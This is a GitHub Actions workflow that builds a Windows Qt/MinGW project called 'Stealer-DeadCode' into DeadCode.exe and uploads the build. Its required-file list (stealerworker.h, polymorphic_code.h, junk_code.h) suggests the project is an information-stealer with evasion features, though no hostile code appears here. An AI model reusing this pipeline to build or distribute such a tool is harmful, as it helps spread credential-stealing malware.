name: Build DeadCode

on:
  push:
    branches:
      - main
  workflow_dispatch:
    inputs:
      cache-buster:
        description: 'Cache buster'
        default: '1'

jobs:
  build-windows:
    runs-on: windows-latest
    timeout-minutes: 120

    steps:
    - name: Checkout repository
      uses: actions/checkout@v4
      with:
        path: Stealer-DeadCode
        fetch-depth: 0

    - name: Setup Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.11'

    - name: Install Python dependencies for aqtinstall
      run: |
        Write-Host "Installing Python dependencies for aqtinstall..."
        python -m pip install setuptools wheel py7zr==0.22.0
        python -m pip install aqtinstall==3.1.*
        python -m aqt version
      shell: powershell

    - name: Check disk space
      run: |
        Write-Host "Checking available disk space..."
        Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'" | Select-Object DeviceID, @{Name="FreeSpace(GB)";Expression={[math]::Round($_.FreeSpace/1GB,2)}}
      shell: powershell

    - name: Cache MSYS2
      uses: actions/cache@v4
      with:
        path: C:/tools/msys64
        key: msys2-${{ runner.os }}-${{ hashFiles('**/choco-install-msys2.yml') }}
        restore-keys: |
          msys2-${{ runner.os }}-

    - name: Test network connectivity
      run: |
        Write-Host "Testing network connectivity to Chocolatey..."
        ping -n 4 community.chocolatey.org
      shell: powershell

    - name: Install MinGW via MSYS2
      run: |
        Write-Host "Installing MSYS2 and MinGW..."
        choco install msys2 -y --timeout 600
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: Failed to install MSYS2 via Chocolatey"
          exit 1
        }
        Write-Host "Updating MSYS2 and installing MinGW..."
        C:\tools\msys64\usr\bin\bash -lc "pacman -Syu --noconfirm"
        C:\tools\msys64\usr\bin\bash -lc "pacman -S --noconfirm mingw-w64-x86_64-gcc mingw-w64-x86_64-make"
        Write-Host "Adding MinGW to PATH..."
        $env:Path = "C:\tools\msys64\mingw64\bin;" + $env:Path
        [System.Environment]::SetEnvironmentVariable("Path", $env:Path, [System.EnvironmentVariableTarget]::Process)
        Write-Host "Verifying MinGW installation..."
        g++ --version
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: g++ --version failed"
          exit 1
        }
        mingw32-make --version
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: mingw32-make --version failed"
          exit 1
        }
      shell: powershell

    - name: Install Perl (required for Qt)
      run: |
        Write-Host "Installing Perl via Chocolatey..."
        choco install strawberryperl -y
        if ($LASTEXITCODE -ne 0 -and $LASTEXITCODE -ne 3010) {
          Write-Host "Error: Failed to install Perl via Chocolatey (exit code: $LASTEXITCODE)"
          exit 1
        }
        Write-Host "Refreshing environment variables..."
        Import-Module "$env:ChocolateyInstall\helpers\chocolateyProfile.psm1"
        refreshenv
      shell: powershell

    - name: Cache Qt
      uses: actions/cache@v4
      with:
        path: C:/Qt/Qt/5.15.2/win64_mingw81
        key: qt-5.15.2-${{ runner.os }}-${{ github.event.inputs.cache-buster || '1' }}
        restore-keys: |
          qt-5.15.2-${{ runner.os }}-

    - name: Install Qt 5.15.2 via aqtinstall
      run: |
        Write-Host "Installing Qt 5.15.2 with MinGW 8.1..."
        python -m aqt install-qt windows desktop 5.15.2 win64_mingw81 -O C:/Qt/Qt --archives qtbase qttools qtsvg qtdeclarative qtquickcontrols qtquickcontrols2 qtgraphicaleffects qtimageformats qtsql --noarchives
        Write-Host "Qt installation completed."
      shell: powershell

    - name: Verify Qt installation
      run: |
        Write-Host "Verifying Qt installation..."
        $qmakePath = "C:/Qt/Qt/5.15.2/win64_mingw81/bin/qmake.exe"
        $uicPath = "C:/Qt/Qt/5.15.2/win64_mingw81/bin/uic.exe"
        if (-not (Test-Path $qmakePath)) {
          Write-Host "Error: qmake.exe not found at $qmakePath"
          dir C:/Qt -Recurse
          exit 1
        }
        if (-not (Test-Path $uicPath)) {
          Write-Host "Error: uic.exe not found at $uicPath"
          dir C:/Qt -Recurse
          exit 1
        }
        $env:Path = "C:/tools/msys64/mingw64/bin;C:/Qt/Qt/5.15.2/win64_mingw81/bin;" + $env:Path
        [System.Environment]::SetEnvironmentVariable("Path", $env:Path, [System.EnvironmentVariableTarget]::Process)
        Write-Host "Verifying qmake..."
        & $qmakePath --version
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: qmake --version failed"
          exit 1
        }
        Write-Host "Qt installation verified"
      shell: powershell

    - name: Cache vcpkg
      uses: actions/cache@v4
      with:
        path: C:/vcpkg
        key: vcpkg-${{ hashFiles('**/vcpkg.json') }}-${{ github.event.inputs.cache-buster || '1' }}
        restore-keys: |
          vcpkg-

    - name: Install vcpkg and dependencies
      run: |
        if (-not (Test-Path C:/vcpkg)) {
          Write-Host "Cloning vcpkg..."
          git clone https://github.com/microsoft/vcpkg.git C:/vcpkg
        }
        Write-Host "Running bootstrap-vcpkg..."
        & C:/vcpkg/bootstrap-vcpkg.bat -disableMetrics
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: Bootstrap failed. Check the logs."
          exit 1
        }
        $vcpkgExe = "C:/vcpkg/vcpkg.exe"
        $env:Path = "C:/vcpkg;" + $env:Path
        [System.Environment]::SetEnvironmentVariable("Path", $env:Path, [System.EnvironmentVariableTarget]::Process)
        Write-Host "Cleaning vcpkg buildtrees and installed directories..."
        Remove-Item -Path "C:/vcpkg/buildtrees" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "C:/vcpkg/installed" -Recurse -Force -ErrorAction SilentlyContinue
        Write-Host "Installing vcpkg dependencies with triplet x64-mingw-static..."
        & $vcpkgExe install sqlite3 libzip zlib bzip2 curl openssl --triplet x64-mingw-static --clean-after-build 2>&1 | Tee-Object -FilePath "Stealer-DeadCode/vcpkg_install.log"
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: vcpkg install failed. Check the logs for details."
          if (Test-Path Stealer-DeadCode/vcpkg_install.log) {
            Get-Content Stealer-DeadCode/vcpkg_install.log
          }
          exit 1
        }
        Write-Host "vcpkg installation completed successfully"
      shell: powershell

    - name: Upload vcpkg logs
      if: failure()
      uses: actions/upload-artifact@v4
      with:
        name: vcpkg-logs
        path: Stealer-DeadCode/vcpkg_install.log
        if-no-files-found: warn

    - name: Verify vcpkg installation
      run: |
        $libDir = "C:/vcpkg/installed/x64-mingw-static/lib"
        $includeDir = "C:/vcpkg/installed/x64-mingw-static/include"
        $libs = @("libsqlite3.a", "libzip.a", "libzlib.a", "libbz2.a", "libcurl.a", "libssl.a", "libcrypto.a")
        $headers = @("sqlite3.h", "zip.h", "zlib.h", "bzlib.h", "curl/curl.h", "openssl/ssl.h", "openssl/crypto.h")
        $missing = @()
        foreach ($lib in $libs) {
          if (-not (Test-Path "$libDir/$lib")) {
            $missing += "$lib"
          }
        }
        foreach ($header in $headers) {
          if (-not (Test-Path "$includeDir/$header")) {
            $missing += $header
          }
        }
        if ($missing) {
          Write-Host "Error: Missing libraries or header files: $missing"
          dir $libDir
          dir $includeDir
          exit 1
        }
        Write-Host "All vcpkg dependencies verified as static"
      shell: powershell

    - name: Verify project structure
      run: |
        cd Stealer-DeadCode
        Write-Host "Current directory: $(Get-Location)"
        $requiredFiles = @(
          "ui/DeadCode.pro",
          "src/main.cpp",
          "ui/mainwindow.ui",
          "ui/mainwindow.cpp",
          "ui/mainwindow.h",
          "src/build_key.h",
          "src/polymorphic_code.h",
          "src/junk_code.h",
          "src/stealerworker.h",
          "icon.rc",
          "icon.ico"
        )
        $missingFiles = @()
        foreach ($file in $requiredFiles) {
          if (-not (Test-Path $file)) {
            $missingFiles += $file
          }
        }
        if ($missingFiles) {
          Write-Host "Error: Missing required files: $missingFiles"
          dir ui -ErrorAction SilentlyContinue
          dir src -ErrorAction SilentlyContinue
          dir . -ErrorAction SilentlyContinue
          exit 1
        }
        Write-Host "Creating build directory if it doesn't exist..."
        New-Item -Path build -ItemType Directory -Force
        Write-Host "Creating release directory if it doesn't exist..."
        New-Item -Path release -ItemType Directory -Force
        Write-Host "Project structure verified"
      shell: powershell

    - name: Fix icon.rc encoding
      run: |
        cd Stealer-DeadCode
        Write-Host "Fixing encoding of icon.rc..."
        $content = Get-Content -Path icon.rc -Raw
        Set-Content -Path icon.rc -Value $content -NoNewline -Encoding ASCII
        Write-Host "icon.rc encoding fixed to ASCII"
      shell: powershell

    - name: Verify and generate UI files
      run: |
        cd Stealer-DeadCode
        Write-Host "Generating ui_mainwindow.h from ui/mainwindow.ui..."
        $uicPath = "C:/Qt/Qt/5.15.2/win64_mingw81/bin/uic.exe"
        $outputPath = "$(Get-Location)/release/ui_mainwindow.h"
        & $uicPath ui/mainwindow.ui -o $outputPath 2>&1 | Tee-Object -FilePath "uic_output.log"
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: uic.exe failed. Check uic_output.log for details."
          Get-Content uic_output.log
          exit 1
        }
        if (-not (Test-Path $outputPath)) {
          Write-Host "Error: $outputPath was not generated"
          exit 1
        }
        Write-Host "ui_mainwindow.h generated successfully at $outputPath"
      shell: powershell

    - name: Configure and build
      run: |
        cd Stealer-DeadCode
        Write-Host "Setting up temporary directory..."
        $tempDir = "C:/Temp"
        if (-not (Test-Path $tempDir)) {
          New-Item -Path $tempDir -ItemType Directory -Force
        }
        $env:TEMP = $tempDir
        $env:TMP = $tempDir
        Write-Host "TEMP set to: $env:TEMP"
        Write-Host "TMP set to: $env:TMP"

        $env:Path = "C:/Qt/Qt/5.15.2/win64_mingw81/bin;C:/vcpkg;C:/tools/msys64/mingw64/bin;" + $env:Path
        [System.Environment]::SetEnvironmentVariable("Path", $env:Path, [System.EnvironmentVariableTarget]::Process)
        Write-Host "Updated PATH: $env:Path"

        # Устанавливаем BUILD_DATE и BUILD_VERSION
        $buildDate = Get-Date -Format "yyyy-MM-dd"
        $buildVersion = git rev-parse --short HEAD
        if (-not $buildVersion) {
          $buildVersion = "unknown"
        }
        Write-Host "Build Date: $buildDate"
        Write-Host "Build Version: $buildVersion"

        cd build
        Write-Host "Running qmake..."
        C:/Qt/Qt/5.15.2/win64_mingw81/bin/qmake.exe ../ui/DeadCode.pro CONFIG+=release QMAKE_CXXFLAGS+=-Wno-attributes "DEFINES+=BUILD_DATE=\\\"$buildDate\\\"" "DEFINES+=BUILD_VERSION=\\\"$buildVersion\\\"" 2>&1 | Tee-Object -FilePath "../qmake_output.log"
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: qmake failed. Check qmake_output.log for details."
          Get-Content ../qmake_output.log
          exit 1
        }

        Write-Host "Running mingw32-make..."
        C:/tools/msys64/mingw64/bin/mingw32-make.exe -f Makefile.Release -j1 2>&1 | Tee-Object -FilePath "../make_output.log"
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: mingw32-make failed. Check make_output.log for details."
          Get-Content ../make_output.log
          exit 1
        }

        if (-not (Test-Path DeadCode.exe)) {
          Write-Host "Error: DeadCode.exe was not generated in build/"
          dir .
          exit 1
        }
        Write-Host "Build completed successfully"
      shell: powershell

    - name: Check DeadCode.exe dependencies
      run: |
        cd Stealer-DeadCode/build
        Write-Host "Checking dependencies of DeadCode.exe..."
        $env:Path += ";C:/tools/msys64/mingw64/bin"
        [System.Environment]::SetEnvironmentVariable("Path", $env:Path, [System.EnvironmentVariableTarget]::Process)
        $objdump = "C:/tools/msys64/mingw64/bin/objdump.exe"
        if (-not (Test-Path $objdump)) {
          Write-Host "Error: objdump.exe not found at $objdump"
          exit 1
        }
        & $objdump -p DeadCode.exe | Select-String "DLL Name" > dependencies.txt
        if (Test-Path dependencies.txt) {
          Write-Host "Dependencies of DeadCode.exe:"
          Get-Content dependencies.txt
        } else {
          Write-Host "No dependencies found or objdump failed."
        }
      shell: powershell

    - name: Copy Qt DLLs and dependencies to build directory
      run: |
        cd Stealer-DeadCode/build
        Write-Host "Copying Qt DLLs and dependencies to build directory..."
        $qtBinDir = "C:/Qt/Qt/5.15.2/win64_mingw81/bin"
        $qtPluginsDir = "C:/Qt/Qt/5.15.2/win64_mingw81/plugins"
        $mingwBinDir = "C:/tools/msys64/mingw64/bin"
        $vcpkgBinDir = "C:/vcpkg/installed/x64-mingw-static/bin"
        $system32Dir = "C:/Windows/System32"

        # Основные и дополнительные Qt DLL
        $requiredQtDlls = @(
          "Qt5Core.dll",
          "Qt5Gui.dll",
          "Qt5Network.dll",
          "Qt5Widgets.dll",
          "Qt5Svg.dll",
          "Qt5Declarative.dll",
          "Qt5Quick.dll",
          "Qt5QuickControls2.dll",
          "Qt5QuickWidgets.dll",
          "Qt5Sql.dll",
          "Qt5GraphicalEffects.dll",
          "Qt5Qml.dll",
          "Qt5QmlModels.dll",
          "Qt5QmlWorkerScript.dll"
        )

        # MinGW DLL
        $requiredMingwDlls = @(
          "libwinpthread-1.dll",
          "libgcc_s_seh-1.dll",
          "libstdc++-6.dll"
        )

        # vcpkg DLL (OpenSSL, zlib, bzip2, curl и т.д.)
        $requiredVcpkgDlls = @(
          "libssl-1_1-x64.dll",
          "libcrypto-1_1-x64.dll",
          "zlib1.dll",
          "bz2.dll",
          "libcurl.dll"
        )

        # Системные DLL для совместимости
        $requiredSystemDlls = @(
          "msvcr120.dll",
          "vcruntime140.dll",
          "ucrtbase.dll",
          "msvcp140.dll",
          "api-ms-win-crt-runtime-l1-1-0.dll",
          "api-ms-win-crt-heap-l1-1-0.dll",
          "api-ms-win-crt-stdio-l1-1-0.dll",
          "api-ms-win-crt-locale-l1-1-0.dll",
          "api-ms-win-crt-math-l1-1-0.dll",
          "api-ms-win-crt-filesystem-l1-1-0.dll",
          "api-ms-win-crt-time-l1-1-0.dll",
          "api-ms-win-crt-environment-l1-1-0.dll",
          "api-ms-win-crt-string-l1-1-0.dll",
          "api-ms-win-core-file-l1-2-0.dll",
          "api-ms-win-core-timezone-l1-1-0.dll",
          "api-ms-win-core-processthreads-l1-1-1.dll",
          "api-ms-win-core-localization-l1-2-0.dll"
        )

        # Копируем Qt DLL
        foreach ($dll in $requiredQtDlls) {
          if (Test-Path "$qtBinDir/$dll") {
            Copy-Item -Path "$qtBinDir/$dll" -Destination .
            Write-Host "Copied $dll to build directory"
          } else {
            Write-Host "Warning: $dll not found in $qtBinDir"
          }
        }

        # Копируем MinGW DLL
        foreach ($dll in $requiredMingwDlls) {
          if (Test-Path "$mingwBinDir/$dll") {
            Copy-Item -Path "$mingwBinDir/$dll" -Destination .
            Write-Host "Copied $dll to build directory"
          } else {
            Write-Host "Warning: $dll not found in $mingwBinDir"
          }
        }

        # Копируем vcpkg DLL
        foreach ($dll in $requiredVcpkgDlls) {
          if (Test-Path "$vcpkgBinDir/$dll") {
            Copy-Item -Path "$vcpkgBinDir/$dll" -Destination .
            Write-Host "Copied $dll to build directory"
          } else {
            Write-Host "Warning: $dll not found in $vcpkgBinDir"
          }
        }

        # Копируем системные DLL
        foreach ($dll in $requiredSystemDlls) {
          if (Test-Path "$system32Dir/$dll") {
            Copy-Item -Path "$system32Dir/$dll" -Destination .
            Write-Host "Copied $dll to build directory"
          } else {
            Write-Host "Warning: $dll not found in $system32Dir"
          }
        }

        # Копируем Qt плагины
        if (Test-Path "$qtPluginsDir") {
          # Платформа Windows
          if (Test-Path "$qtPluginsDir/platforms") {
            New-Item -Path "platforms" -ItemType Directory -Force
            Copy-Item -Path "$qtPluginsDir/platforms/qwindows.dll" -Destination "platforms/" -ErrorAction SilentlyContinue
            Write-Host "Copied Qt platform plugin qwindows.dll"
          }

          # Стили
          if (Test-Path "$qtPluginsDir/styles") {
            New-Item -Path "styles" -ItemType Directory -Force
            Copy-Item -Path "$qtPluginsDir/styles/qwindowsvistastyle.dll" -Destination "styles/" -ErrorAction SilentlyContinue
            Write-Host "Copied Qt style plugin qwindowsvistastyle.dll"
          }

          # Форматы изображений
          if (Test-Path "$qtPluginsDir/imageformats") {
            New-Item -Path "imageformats" -ItemType Directory -Force
            Copy-Item -Path "$qtPluginsDir/imageformats/*.dll" -Destination "imageformats/" -ErrorAction SilentlyContinue
            Write-Host "Copied Qt imageformats plugins"
          }

          # Qt Quick
          if (Test-Path "$qtPluginsDir/quick") {
            New-Item -Path "quick" -ItemType Directory -Force
            Copy-Item -Path "$qtPluginsDir/quick/*.dll" -Destination "quick/" -ErrorAction SilentlyContinue
            Write-Host "Copied Qt Quick plugins"
          }

          # Qt QML
          if (Test-Path "$qtPluginsDir/qmltooling") {
            New-Item -Path "qmltooling" -ItemType Directory -Force
            Copy-Item -Path "$qtPluginsDir/qmltooling/*.dll" -Destination "qmltooling/" -ErrorAction SilentlyContinue
            Write-Host "Copied Qt QML tooling plugins"
          }

          # Qt Graphical Effects
          if (Test-Path "$qtPluginsDir/effects") {
            New-Item -Path "effects" -ItemType Directory -Force
            Copy-Item -Path "$qtPluginsDir/effects/*.dll" -Destination "effects/" -ErrorAction SilentlyContinue
            Write-Host "Copied Qt Graphical Effects plugins"
          }

          # Qt SQL драйверы
          if (Test-Path "$qtPluginsDir/sqldrivers") {
            New-Item -Path "sqldrivers" -ItemType Directory -Force
            Copy-Item -Path "$qtPluginsDir/sqldrivers/*.dll" -Destination "sqldrivers/" -ErrorAction SilentlyContinue
            Write-Host "Copied Qt SQL drivers"
          }
        } else {
          Write-Host "Warning: Qt plugins directory not found at $qtPluginsDir"
        }

        Write-Host "Listing contents of build directory after copying DLLs:"
        dir .
        dir platforms -ErrorAction SilentlyContinue
        dir styles -ErrorAction SilentlyContinue
        dir imageformats -ErrorAction SilentlyContinue
        dir quick -ErrorAction SilentlyContinue
        dir qmltooling -ErrorAction SilentlyContinue
        dir effects -ErrorAction SilentlyContinue
        dir sqldrivers -ErrorAction SilentlyContinue
      shell: powershell

    - name: Upload build logs
      if: failure()
      uses: actions/upload-artifact@v4
      with:
        name: build-logs
        path: |
          Stealer-DeadCode/qmake_output.log
          Stealer-DeadCode/make_output.log
          Stealer-DeadCode/uic_output.log
          Stealer-DeadCode/vcpkg_install.log
        if-no-files-found: warn

    - name: Upload artifact
      uses: actions/upload-artifact@v4
      with:
        name: DeadCode-Build
        path: |
          Stealer-DeadCode/build/DeadCode.exe
          Stealer-DeadCode/build/Qt5Core.dll
          Stealer-DeadCode/build/Qt5Gui.dll
          Stealer-DeadCode/build/Qt5Network.dll
          Stealer-DeadCode/build/Qt5Widgets.dll
          Stealer-DeadCode/build/Qt5Svg.dll
          Stealer-DeadCode/build/Qt5Declarative.dll
          Stealer-DeadCode/build/Qt5Quick.dll
          Stealer-DeadCode/build/Qt5QuickControls2.dll
          Stealer-DeadCode/build/Qt5QuickWidgets.dll
          Stealer-DeadCode/build/Qt5Sql.dll
          Stealer-DeadCode/build/Qt5GraphicalEffects.dll
          Stealer-DeadCode/build/Qt5Qml.dll
          Stealer-DeadCode/build/Qt5QmlModels.dll
          Stealer-DeadCode/build/Qt5QmlWorkerScript.dll
          Stealer-DeadCode/build/libwinpthread-1.dll
          Stealer-DeadCode/build/libgcc_s_seh-1.dll
          Stealer-DeadCode/build/libstdc++-6.dll
          Stealer-DeadCode/build/libssl-1_1-x64.dll
          Stealer-DeadCode/build/libcrypto-1_1-x64.dll
          Stealer-DeadCode/build/zlib1.dll
          Stealer-DeadCode/build/bz2.dll
          Stealer-DeadCode/build/libcurl.dll
          Stealer-DeadCode/build/msvcr120.dll
          Stealer-DeadCode/build/vcruntime140.dll
          Stealer-DeadCode/build/ucrtbase.dll
          Stealer-DeadCode/build/msvcp140.dll
          Stealer-DeadCode/build/api-ms-win-crt-runtime-l1-1-0.dll
          Stealer-DeadCode/build/api-ms-win-crt-heap-l1-1-0.dll
          Stealer-DeadCode/build/api-ms-win-crt-stdio-l1-1-0.dll
          Stealer-DeadCode/build/api-ms-win-crt-locale-l1-1-0.dll
          Stealer-DeadCode/build/api-ms-win-crt-math-l1-1-0.dll
          Stealer-DeadCode/build/api-ms-win-crt-filesystem-l1-1-0.dll
          Stealer-DeadCode/build/api-ms-win-crt-time-l1-1-0.dll
          Stealer-DeadCode/build/api-ms-win-crt-environment-l1-1-0.dll
          Stealer-DeadCode/build/api-ms-win-crt-string-l1-1-0.dll
          Stealer-DeadCode/build/api-ms-win-core-file-l1-2-0.dll
          Stealer-DeadCode/build/api-ms-win-core-timezone-l1-1-0.dll
          Stealer-DeadCode/build/api-ms-win-core-processthreads-l1-1-1.dll
          Stealer-DeadCode/build/api-ms-win-core-localization-l1-2-0.dll
          Stealer-DeadCode/build/platforms/qwindows.dll
          Stealer-DeadCode/build/styles/qwindowsvistastyle.dll
          Stealer-DeadCode/build/imageformats/*.dll
          Stealer-DeadCode/build/quick/*.dll
          Stealer-DeadCode/build/qmltooling/*.dll
          Stealer-DeadCode/build/effects/*.dll
          Stealer-DeadCode/build/sqldrivers/*.dll
        if-no-files-found: error

    - name: Cleanup
      if: always()
      run: |
        Remove-Item -Path "Stealer-DeadCode/build" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "Stealer-DeadCode/release" -Recurse -Force -ErrorAction SilentlyContinue
      shell: powershell